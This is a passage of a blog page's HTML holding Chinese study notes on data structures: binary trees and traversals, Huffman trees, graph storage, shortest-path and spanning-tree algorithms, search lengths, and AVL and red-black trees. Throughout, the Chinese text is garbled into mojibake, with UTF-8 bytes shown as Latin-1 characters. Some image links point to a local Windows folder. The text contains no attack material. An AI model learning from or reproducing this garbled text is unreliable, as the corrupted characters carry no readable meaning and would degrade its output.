‘ç¼–å·ä¸º1-nçš„ç»“ç‚¹ä¸€ä¸€å¯¹åº”.<br><strong>ç‰¹ç‚¹</strong><br>1.å¶å­ç»“ç‚¹åªå¯èƒ½å‡ºç°åœ¨æœ€ä¸‹é¢ä¸¤å±‚ä¸­<br>2.æœ€ä¸‹ä¸€å±‚å¶å­ç»“ç‚¹éƒ½ä¾æ¬¡æ’åˆ—åœ¨è¯¥å±‚æœ€å·¦è¾¹çš„ä½ç½®ä¸Š<br>3.è‹¥æœ‰åº¦ä¸º1çš„ç»“ç‚¹åªå¯èƒ½æœ‰1ä¸ªä¸”è¯¥ç»“ç‚¹åªæœ‰å·¦å­©å­æ— å³å­©å­<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227184713123.png" alt="image-20231227184713123"></p><h5 id="éå®Œå…¨äºŒå‰æ ‘"><a href="#éå®Œå…¨äºŒå‰æ ‘" class="headerlink" title="éå®Œå…¨äºŒå‰æ ‘"></a>éå®Œå…¨äºŒå‰æ ‘</h5><p>  <img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227185531440.png" alt="image-20231227185531440"></p><h5 id="å¸¸ç”¨å…¬å¼"><a href="#å¸¸ç”¨å…¬å¼" class="headerlink" title="å¸¸ç”¨å…¬å¼"></a>å¸¸ç”¨å…¬å¼</h5><p>$$<br>å¶å­ç»“ç‚¹çš„æ•°é‡ï¼ˆn0ï¼‰ &#x3D; åº¦ä¸º2çš„ç»“ç‚¹ï¼ˆn2ï¼‰+1<br>$$</p><p>$$<br>n(æ€»èŠ‚ç‚¹) &#x3D; n0ï¼ˆå¶å­èŠ‚ç‚¹ï¼‰+n1ï¼ˆåº¦ä¸º1çš„èŠ‚ç‚¹ï¼‰+n2ï¼ˆåŒå‰ï¼‰ &#x3D; 2n2+n1+1<br>n0 &#x3D; n2+1<br>$$</p><h4 id="äºŒå‰æ ‘çš„éå†"><a href="#äºŒå‰æ ‘çš„éå†" class="headerlink" title="äºŒå‰æ ‘çš„éå†"></a>äºŒå‰æ ‘çš„éå†</h4><p>å…ˆåºéå†ï¼šæ ¹å·¦å³<br>ä¸­åºéå†ï¼šå·¦æ ¹å³<br>ååºéå†ï¼šå·¦å³æ ¹</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227194941329.png" alt="image-20231227194941329"></p><p>å…ˆåºéå†ç¬¬ä¸€ä¸ªä¸ºæ ¹èŠ‚ç‚¹<br>ååºéå†æœ€åä¸€ä¸ªæ˜¯æ ¹èŠ‚ç‚¹<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227200402845.png" alt="image-20231227200402845"></p><h4 id="çº¿ç´¢äºŒå‰æ ‘"><a href="#çº¿ç´¢äºŒå‰æ ‘" class="headerlink" title="çº¿ç´¢äºŒå‰æ ‘"></a>çº¿ç´¢äºŒå‰æ ‘</h4><h5 id="å‰åºçº¿ç´¢äºŒå‰æ ‘"><a href="#å‰åºçº¿ç´¢äºŒå‰æ ‘" class="headerlink" title="å‰åºçº¿ç´¢äºŒå‰æ ‘"></a>å‰åºçº¿ç´¢äºŒå‰æ ‘</h5><p>ç¼ºå°‘å·¦å­©å­ç”»å‡ºå‰é©± ç¼ºå°‘å³å­©å­ç”»å‡ºåç»§</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228095808924.png" alt="image-20231228095808924"></p><h5 id="ä¸­åºçº¿ç´¢äºŒå‰æ ‘"><a href="#ä¸­åºçº¿ç´¢äºŒå‰æ ‘" class="headerlink" title="ä¸­åºçº¿ç´¢äºŒå‰æ ‘"></a>ä¸­åºçº¿ç´¢äºŒå‰æ ‘</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100248464.png" alt="image-20231228100248464"></p><h5 id="ååºçº¿ç´¢äºŒå‰æ ‘"><a href="#ååºçº¿ç´¢äºŒå‰æ ‘" class="headerlink" title="ååºçº¿ç´¢äºŒå‰æ ‘"></a>ååºçº¿ç´¢äºŒå‰æ ‘</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100404375.png" alt="image-20231228100404375"></p><h4 id="æ ‘çš„å­˜å‚¨ç»“æ„"><a href="#æ ‘çš„å­˜å‚¨ç»“æ„" class="headerlink" title="æ ‘çš„å­˜å‚¨ç»“æ„"></a>æ ‘çš„å­˜å‚¨ç»“æ„</h4><h5 id="åŒäº²è¡¨ç¤ºæ³•"><a href="#åŒäº²è¡¨ç¤ºæ³•" class="headerlink" title="åŒäº²è¡¨ç¤ºæ³•"></a>åŒäº²è¡¨ç¤ºæ³•</h5><p>æ ¹ç»“ç‚¹æ— çˆ¶äº² æ•…ä¸º-1<br>Fçš„çˆ¶èŠ‚ç‚¹æ˜¯C Cçš„ä¸‹æ ‡æ˜¯3</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228104447870.png" alt="image-20231228104447870"></p><h5 id="å­©å­è¡¨ç¤ºæ³•"><a href="#å­©å­è¡¨ç¤ºæ³•" class="headerlink" title="å­©å­è¡¨ç¤ºæ³•"></a>å­©å­è¡¨ç¤ºæ³•</h5><p>é“¾å¼è¿›è¡Œå­˜å‚¨ æŸ¥æ‰¾é€Ÿåº¦å¾ˆå¿«</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110149679.png" alt="image-20231228110149679"></p><h5 id="å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•"><a href="#å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•" class="headerlink" title="å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•"></a>å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•</h5><p>å…„å¼Ÿå…„å¼Ÿå¾€ä¸‹å­˜<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110943965.png" alt="image-20231228110943965"></p><h4 id="æ£®æ—ã€æ ‘å’ŒäºŒå‰æ ‘ä¹‹é—´çš„è½¬æ¢"><a href="#æ£®æ—ã€æ ‘å’ŒäºŒå‰æ ‘ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="æ£®æ—ã€æ ‘å’ŒäºŒå‰æ ‘ä¹‹é—´çš„è½¬æ¢"></a>æ£®æ—ã€æ ‘å’ŒäºŒå‰æ ‘ä¹‹é—´çš„è½¬æ¢</h4><h5 id="æ ‘è½¬æ¢ä¸ºäºŒå‰æ ‘"><a href="#æ ‘è½¬æ¢ä¸ºäºŒå‰æ ‘" class="headerlink" title="æ ‘è½¬æ¢ä¸ºäºŒå‰æ ‘"></a>æ ‘è½¬æ¢ä¸ºäºŒå‰æ ‘</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104015443.png" alt="image-20240104104015443"></p><h5 id="äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘"><a href="#äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘" class="headerlink" title="äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘"></a>äºŒå‰æ ‘è½¬æ¢ä¸ºæ ‘</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104150920.png" alt="image-20240104104150920"></p><h5 id="æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘"><a href="#æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘" class="headerlink" title="æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘"></a>æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240104104351221.png" alt="image-20240104104351221"></h5><h5 id="äºŒå‰æ ‘è½¬æ¢ä¸ºæ£®æ—"><a href="#äºŒå‰æ ‘è½¬æ¢ä¸ºæ£®æ—" class="headerlink" title="äºŒå‰æ ‘è½¬æ¢ä¸ºæ£®æ—"></a>äºŒå‰æ ‘è½¬æ¢ä¸ºæ£®æ—</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104105859199.png" alt="image-20240104105859199"></p><h4 id="å“ˆå¤«æ›¼æ ‘çš„æ„é€ "><a href="#å“ˆå¤«æ›¼æ ‘çš„æ„é€ " class="headerlink" title="å“ˆå¤«æ›¼æ ‘çš„æ„é€ "></a>å“ˆå¤«æ›¼æ ‘çš„æ„é€ </h4><p>Qï¼šæ„é€ 19, 21,2,3,6ï¼Œ7, 10ï¼Œ32çš„å“ˆå¤«æ›¼æ ‘,å¹¶è®¡ç®—WPLã€”å¸¦æƒè·¯å¾„é•¿åº¦ï¼‰çš„å€¼ã€‚</p><p>Step:<br>1.é€‰æ‹©ä¸¤ä¸ªæœ€å°ç»“ç‚¹<br>2.ç”¨è®¡ç®—ç»“ç‚¹æ›¿ä»£åŸä¸¤ç»“ç‚¹<br>3.æ¯”è¾ƒè¿ç®—ç»“æœ å¾ªç¯ä¸Šè¿°æ­¥éª¤</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110509254.png" alt="image-20240104110509254"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPLè®¡ç®—ï¼šç»“ç‚¹å€¼*å±‚æ•°</span><br></pre></td></tr></table></figure><h4 id="å›¾çš„å®šä¹‰å’Œæœ¯è¯­"><a href="#å›¾çš„å®šä¹‰å’Œæœ¯è¯­" class="headerlink" title="å›¾çš„å®šä¹‰å’Œæœ¯è¯­"></a>å›¾çš„å®šä¹‰å’Œæœ¯è¯­</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110926157.png" alt="image-20240104110926157"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110956343.png" alt="image-20240104110956343"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111004803.png" alt="image-20240104111004803"></p><h4 id="é‚»æ¥çŸ©é˜µï¼ˆå›¾çš„ä¸€ç§å­˜å‚¨ç»“æ„ï¼‰"><a href="#é‚»æ¥çŸ©é˜µï¼ˆå›¾çš„ä¸€ç§å­˜å‚¨ç»“æ„ï¼‰" class="headerlink" title="é‚»æ¥çŸ©é˜µï¼ˆå›¾çš„ä¸€ç§å­˜å‚¨ç»“æ„ï¼‰"></a>é‚»æ¥çŸ©é˜µï¼ˆå›¾çš„ä¸€ç§å­˜å‚¨ç»“æ„ï¼‰</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿é€šå†™1 ä¸è¿é€šå†™0</span><br></pre></td></tr></table></figure><h5 id="æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µ"><a href="#æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µ" class="headerlink" title="æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µ"></a>æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µ</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111642007.png" alt="image-20240104111642007"><strong>ç‰¹ç‚¹</strong>ï¼šå‰åŠéƒ¨åˆ†å’ŒååŠéƒ¨åˆ†å¯¹ç§°</p><h5 id="æœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µ"><a href="#æœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µ" class="headerlink" title="æœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µ"></a>æœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µ</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111933916.png" alt="image-20240104111933916"></p><p><strong>ç‰¹ç‚¹</strong>ï¼šä¸å¯¹ç§° å‡ºåº¦æŒ‰è¡Œæ±‚å’Œ å…¥åº¦æŒ‰åˆ—æ±‚å’Œ </p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">æ€»åº¦æ•°</span>=<span class="string">å‡ºåº¦+å…¥åº¦</span></span><br></pre></td></tr></table></figure><h5 id="æœ‰æƒå›¾çš„é‚»æ¥çŸ©é˜µ"><a href="#æœ‰æƒå›¾çš„é‚»æ¥çŸ©é˜µ" class="headerlink" title="æœ‰æƒå›¾çš„é‚»æ¥çŸ©é˜µ"></a>æœ‰æƒå›¾çš„é‚»æ¥çŸ©é˜µ</h5><p>**ä¸¤ä¸ªç»“ç‚¹æ— è¿æ¥å¡«æ— ç©·å¤§ **</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112102780.png" alt="image-20240104112102780"></p><h4 id="é‚»æ¥è¡¨æ³•"><a href="#é‚»æ¥è¡¨æ³•" class="headerlink" title="é‚»æ¥è¡¨æ³•"></a>é‚»æ¥è¡¨æ³•</h4><h5 id="é‚»æ¥çŸ©é˜µå­˜åœ¨çš„ç¼ºç‚¹ï¼š"><a href="#é‚»æ¥çŸ©é˜µå­˜åœ¨çš„ç¼ºç‚¹ï¼š" class="headerlink" title="é‚»æ¥çŸ©é˜µå­˜åœ¨çš„ç¼ºç‚¹ï¼š"></a>é‚»æ¥çŸ©é˜µå­˜åœ¨çš„ç¼ºç‚¹ï¼š</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112151351.png" alt="image-20240104112151351"></p><h5 id="æ— å‘å›¾çš„é‚»æ¥è¡¨"><a href="#æ— å‘å›¾çš„é‚»æ¥è¡¨" class="headerlink" title="æ— å‘å›¾çš„é‚»æ¥è¡¨"></a>æ— å‘å›¾çš„é‚»æ¥è¡¨</h5><p><strong>ç”»å‡ºé¡¶ç‚¹åŸŸå’Œè¾¹è¡¨å¤´æŒ‡é’ˆåŸŸ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112425169.png" alt="image-20240104112425169"><strong>è¡¨å¤´æŒ‡é’ˆåŸŸæ— æŒ‡å‘çš„æ—¶å€™ç”¨åæ–œæ </strong></p><h5 id="æœ‰å‘å›¾çš„é‚»æ¥è¡¨"><a href="#æœ‰å‘å›¾çš„é‚»æ¥è¡¨" class="headerlink" title="æœ‰å‘å›¾çš„é‚»æ¥è¡¨"></a>æœ‰å‘å›¾çš„é‚»æ¥è¡¨</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112519850.png" alt="image-20240104112519850"></p><h4 id="åå­—é“¾è¡¨ç”»æ³•"><a href="#åå­—é“¾è¡¨ç”»æ³•" class="headerlink" title="åå­—é“¾è¡¨ç”»æ³•"></a>åå­—é“¾è¡¨ç”»æ³•</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112901484.png" alt="image-20240104112901484"></p><h5 id="1-å†™å‡ºç»“ç‚¹åŸŸ"><a href="#1-å†™å‡ºç»“ç‚¹åŸŸ" class="headerlink" title="1.å†™å‡ºç»“ç‚¹åŸŸ"></a>1.å†™å‡ºç»“ç‚¹åŸŸ</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112738435.png" alt="image-20240104112738435"></p><h5 id="2-å¼€ç”»"><a href="#2-å¼€ç”»" class="headerlink" title="2.å¼€ç”»"></a>2.å¼€ç”»</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112914603.png" alt="image-20240104112914603"></p><h5 id="3-æ‰¾å‡ºç»“ç‚¹åŸŸåºå·å¯¹åº”çš„ç©ºæ ¼è¿›è¡Œè¿æ¥æŒ‡å‘-ç»“æŸç¬¦"><a href="#3-æ‰¾å‡ºç»“ç‚¹åŸŸåºå·å¯¹åº”çš„ç©ºæ ¼è¿›è¡Œè¿æ¥æŒ‡å‘-ç»“æŸç¬¦" class="headerlink" title="3.æ‰¾å‡ºç»“ç‚¹åŸŸåºå·å¯¹åº”çš„ç©ºæ ¼è¿›è¡Œè¿æ¥æŒ‡å‘+ç»“æŸç¬¦"></a>3.æ‰¾å‡ºç»“ç‚¹åŸŸåºå·å¯¹åº”çš„ç©ºæ ¼è¿›è¡Œè¿æ¥æŒ‡å‘+ç»“æŸç¬¦</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104113056715.png" alt="image-20240104113056715"></p><h5 id="4-æŒ‰ç…§å¼§åº¦é¡ºåºç”»å›¾"><a href="#4-æŒ‰ç…§å¼§åº¦é¡ºåºç”»å›¾" class="headerlink" title="4.æŒ‰ç…§å¼§åº¦é¡ºåºç”»å›¾"></a>4.æŒ‰ç…§å¼§åº¦é¡ºåºç”»å›¾</h5><p>0ï¼Œ1ï¼Œ2ï¼Œ3</p><h4 id="å›¾çš„å¹¿åº¦ä¼˜å…ˆéå†"><a href="#å›¾çš„å¹¿åº¦ä¼˜å…ˆéå†" class="headerlink" title="å›¾çš„å¹¿åº¦ä¼˜å…ˆéå†"></a>å›¾çš„å¹¿åº¦ä¼˜å…ˆéå†</h4><p><strong>å±‚å±‚æ±‚è§£</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182328110.png" alt="image-20240104182328110"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182317826.png" alt="image-20240104182317826"></p><h4 id="å›¾çš„æ·±åº¦ä¼˜å…ˆéå†"><a href="#å›¾çš„æ·±åº¦ä¼˜å…ˆéå†" class="headerlink" title="å›¾çš„æ·±åº¦ä¼˜å…ˆéå†"></a>å›¾çš„æ·±åº¦ä¼˜å…ˆéå†</h4><h5 id="æ‚¬å´–å‹’é©¬"><a href="#æ‚¬å´–å‹’é©¬" class="headerlink" title="æ‚¬å´–å‹’é©¬"></a>æ‚¬å´–å‹’é©¬</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154907188.png" alt="image-20240108154907188"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154928796.png" alt="image-20240108154928796"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154949965.png" alt="image-20240108154949965"></p><h4 id="Primç®—æ³•ï¼ˆæ±‚è§£æœ€å°ç”Ÿæˆæ ‘"><a href="#Primç®—æ³•ï¼ˆæ±‚è§£æœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="Primç®—æ³•ï¼ˆæ±‚è§£æœ€å°ç”Ÿæˆæ ‘)"></a>Primç®—æ³•ï¼ˆæ±‚è§£æœ€å°ç”Ÿæˆæ ‘)</h4><p>1.ä»ç»“ç‚¹å‡ºå‘ï¼Œä¼˜å…ˆé€‰æ‹©æƒå€¼è¾ƒå°çš„è¾¹<br>2.å†é€‰æ‹©ä¸æ‰€é€‰é¡¶ç‚¹ä¸­æƒå€¼æœ€å°çš„è¾¹<br>3.ç›´åˆ°è¿æ¥æ‰€æœ‰é¡¶ç‚¹<br><strong>æ³¨æ„</strong>ï¼šè¿æ¥è¿‡ç¨‹ä¸­ä¸èƒ½å‡ºç°ç¯<br>å¦‚å›¾ï¼š<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108162751161.png" alt="image-20240108162751161"></p><h4 id="Kruskalç®—æ³•ï¼ˆæœ€å°ç”Ÿæˆæ ‘ï¼‰"><a href="#Kruskalç®—æ³•ï¼ˆæœ€å°ç”Ÿæˆæ ‘ï¼‰" class="headerlink" title="Kruskalç®—æ³•ï¼ˆæœ€å°ç”Ÿæˆæ ‘ï¼‰"></a>Kruskalç®—æ³•ï¼ˆæœ€å°ç”Ÿæˆæ ‘ï¼‰</h4><p>1.æ‰¾å‡ºæœ€å°è¾¹<br>2.åˆ¤æ–­æ˜¯å¦æœ‰ç¯<br>3.ç›´åˆ°è¿æ¥æ‰€æœ‰é¡¶ç‚¹</p><h4 id="æœ€çŸ­è·¯å¾„-Dijkstraç®—æ³•"><a href="#æœ€çŸ­è·¯å¾„-Dijkstraç®—æ³•" class="headerlink" title="æœ€çŸ­è·¯å¾„-Dijkstraç®—æ³•"></a>æœ€çŸ­è·¯å¾„-Dijkstraç®—æ³•</h4><p>Tï¼šå¯ä»¥ç¡®å®šåˆ°è¾¾<br>Fï¼šæ— æ³•ç¡®å®šåˆ°è¾¾<br>dis:è·ç¦»<br>æ— æ³•ç›´æ¥åˆ°è¾¾å¡«æ— ç©·å¤§<br>æ¢ç‚¹æ±‚å€¼çš„disè‹¥å°äºåŸdiséœ€æ›´æ–°å°†å…¶æ›´æ–°ä¸ºdis</p><p>ä»1ç‚¹å‡ºå‘åˆ°è¾¾æ¯ä¸ªç»“ç‚¹çš„æœ€çŸ­è·¯å¾„<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108164053120.png" alt="image-20240108164053120"></p><h4 id="æœ€çŸ­è·¯å¾„-Floydç®—æ³•"><a href="#æœ€çŸ­è·¯å¾„-Floydç®—æ³•" class="headerlink" title="æœ€çŸ­è·¯å¾„-Floydç®—æ³•"></a>æœ€çŸ­è·¯å¾„-Floydç®—æ³•</h4><p>è¡Œï¼šèµ·å§‹ç‚¹<br>åˆ—</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108165520716.png" alt="image-20240108165520716"></p><p>å»æ‰å‡ºå‘ç‚¹ç»“æŸç‚¹ä»¥åŠæ–œå¯¹è§’ï¼ˆå³æ‰€æ±‚ç‚¹æ‰€åœ¨çš„è¡Œå’Œåˆ—è¡Œåˆ—ï¼‰<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108170055738.png" alt="image-20240108170055738"></p><h4 id="æ‹“æ‰‘æ’åºå’Œé€†æ‹“æ‰‘æ’åº"><a href="#æ‹“æ‰‘æ’åºå’Œé€†æ‹“æ‰‘æ’åº" class="headerlink" title="æ‹“æ‰‘æ’åºå’Œé€†æ‹“æ‰‘æ’åº"></a>æ‹“æ‰‘æ’åºå’Œé€†æ‹“æ‰‘æ’åº</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108171446237.png" alt="image-20240108171446237"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172207326.png" alt="image-20240108172207326"></p><h4 id="AOEç½‘ä¸­çš„å…³é”®è·¯å¾„"><a href="#AOEç½‘ä¸­çš„å…³é”®è·¯å¾„" class="headerlink" title="AOEç½‘ä¸­çš„å…³é”®è·¯å¾„"></a>AOEç½‘ä¸­çš„å…³é”®è·¯å¾„</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172733812.png" alt="image-20240108172733812"></p><p>æœ€è¿Ÿå‘ç”Ÿæ—¶é—´ä»v6å¼€å§‹è®¡ç®— äº‹ä»¶å‘ç”Ÿçš„æœ€æ—©æ—¶é—´-å¯¹åº”æƒå€¼<br>å…³é”®è·¯å¾„ï¼šæœ€æ—©æ—¶é—´å’Œæœ€è¿Ÿæ—¶é—´ç›¸ç­‰çš„ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172908486.png" alt="image-20240108172908486"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108173114691.png" alt="image-20240108173114691"></p><h4 id="å¹³å‡æŸ¥æ‰¾é•¿åº¦-æŠ˜åŠæŸ¥æ‰¾"><a href="#å¹³å‡æŸ¥æ‰¾é•¿åº¦-æŠ˜åŠæŸ¥æ‰¾" class="headerlink" title="å¹³å‡æŸ¥æ‰¾é•¿åº¦-æŠ˜åŠæŸ¥æ‰¾"></a>å¹³å‡æŸ¥æ‰¾é•¿åº¦-æŠ˜åŠæŸ¥æ‰¾</h4><p>Stepï¼š1.é€‰å€¼ç”»æ ‘<br>           2.ç®—æ•°</p><p>å…ˆæ‰¾æ ¹èŠ‚ç‚¹ï¼ˆå‘ä¸‹å–æ•´ï¼‰ å†ä¾æ¬¡æ‰¾å‡ºå·¦å³å­©å­ï¼ˆå‡å€¼ä¸”å‘ä¸‹å–æ•´ï¼‰</p><p>æŸ¥æ‰¾æˆåŠŸçš„è¡¥ä¸Šæ‰€ç¼ºçš„å­©å­ å¶å­èŠ‚ç‚¹è¡¥ä¸Šå·¦å³å­©å­</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205655509.png" alt="image-20240108205655509"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ä¸€å±‚çš„å±‚æ•°*å¯¹åº”èŠ‚ç‚¹æ•°</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205835058.png" alt="image-20240108205835058"></p><p><strong>æ³¨æ„ï¼š</strong>æŸ¥æ‰¾å¤±è´¥çš„å¶å­èŠ‚ç‚¹è®¡ç®—å±‚æ•°å¾€ä¸ŠæŠ¬ä¸€å±‚ï¼ˆå³å‡å°‘ä¸€å±‚ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210009654.png" alt="image-20240108210009654"></p><h4 id="å¹³å‡æŸ¥æ‰¾é•¿åº¦-åˆ†å—æŸ¥æ‰¾"><a href="#å¹³å‡æŸ¥æ‰¾é•¿åº¦-åˆ†å—æŸ¥æ‰¾" class="headerlink" title="å¹³å‡æŸ¥æ‰¾é•¿åº¦-åˆ†å—æŸ¥æ‰¾"></a>å¹³å‡æŸ¥æ‰¾é•¿åº¦-åˆ†å—æŸ¥æ‰¾</h4><p>åˆ†å—ï¼šå—å†…æ— åºï¼Œå—é—´æœ‰åº</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210133747.png" alt="image-20240108210133747"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211235371.png" alt="image-20240108211235371"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240108211515589.png" alt="image-20240108211515589"></p><h4 id="å¹³è¡¡äºŒå‰æ ‘"><a href="#å¹³è¡¡äºŒå‰æ ‘" class="headerlink" title="å¹³è¡¡äºŒå‰æ ‘"></a>å¹³è¡¡äºŒå‰æ ‘</h4><p>1.å¹³è¡¡äºŒå‰æ ‘å·¦å­æ ‘å’Œå³å­æ ‘é«˜åº¦ä¹‹å·®ä¸è¶…è¿‡1<br>2.ä»¥ä¸å¹³è¡¡äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ²¿ç€åŠ å…¥çš„ç»“ç‚¹æ–¹å‘ä¸ä¹‹ç›¸é‚»çš„ä¸‰ä¸ªç»“ç‚¹è¿›è¡Œè°ƒæ•´</p><p><strong>å¤§äº-&gt;å³å­©å­ å°äº-&gt;å·¦å­©å­</strong><br>48ä¸ºæ ¹èŠ‚ç‚¹ å·¦å­©å­çš„åº¦æ•°ä¸º0 å³å­©å­çš„åº¦æ•°ä¸º2 éœ€è°ƒæ•´<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211940132.png" alt="image-20240108211940132"></p><p>æ‰¾åˆ°ä¸æ ¹èŠ‚ç‚¹ï¼ˆåŒ…å«æ ¹èŠ‚ç‚¹ï¼‰ç›¸é‚»çš„ä¸‰ä¸ªç»“ç‚¹æ‰¾åˆ°ä¸­é—´å€¼ è¿›è¡Œå·¦å³å­©å­è°ƒæ•´åç§»åˆ°åŸæ¥ä½ç½®ã€ç‰¹åˆ«æ³¨æ„å•é•¿åˆ†æ”¯ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212015309.png" alt="image-20240108212015309"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212157146.png" alt="image-20240108212157146"></p><p>è®°å¾—å·¦è¾¹å­©å­ä¹Ÿè¦è°ƒæ•´<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212247659.png" alt="image-20240108212247659"></p><h4 id="çº¢é»‘æ ‘"><a href="#çº¢é»‘æ ‘" class="headerlink" title="çº¢é»‘æ ‘"></a>çº¢é»‘æ ‘</h4><p><strong>å®šä¹‰</strong><br>ç‰¹æ®Šçš„äºŒå‰æ’åºæ ‘ï¼Œä¸»è¦ç”¨å®ƒå­˜å‚¨æœ‰åºçš„ç»“æ„ï¼ŒæŸ¥æ‰¾æ“ä½œæ—¶é—´å¤æ‚åº¦Oï¼ˆlog2nï¼‰</p><p><strong>ç‰¹æ€§</strong><br>1.æ¯ä¸ªç»“ç‚¹çº¢è‰²&#x2F;é»‘è‰²<br>2.æ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²çš„<br>3.å¶èŠ‚ç‚¹ï¼ˆå¤–éƒ¨ç»“ç‚¹ã€NULLç»“ç‚¹ã€å¤±è´¥ç»“ç‚¹ï¼‰å‡æ˜¯é»‘è‰²çš„<br>4.ä¸å­˜åœ¨ä¸¤ä¸ªç›¸é‚»çš„çº¢ç»“ç‚¹ï¼ˆå³çº¢ç»“ç‚¹çš„çˆ¶èŠ‚ç‚¹å’Œå­©å­éƒ½æ˜¯é»‘è‰²çš„ï¼‰æ¯ä¸¤ä¸ªçº¢è‰²ç»“ç‚¹ä¹‹é—´å¿…æœ‰ä¸€ä¸ªé»‘è‰²ç»“ç‚¹è¿›è¡Œé—´éš”<br>5.å¯¹äºæ¯ä¸ªç»“ç‚¹ï¼Œä»è¯¥èŠ‚ç‚¹åˆ°ä»»ä¸€å¶ç»“ç‚¹çš„ç®€å•è·¯å¾„ä¸Šï¼Œæ‰€å«é»‘ç»“ç‚¹çš„æ•°ç›®ç›¸åŒ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å·¦æ ¹å³ï¼ˆå·¦å­©å­å°äºå³å­©å­ï¼‰</span><br><span class="line">æ ¹å¶é»‘ï¼ˆæ 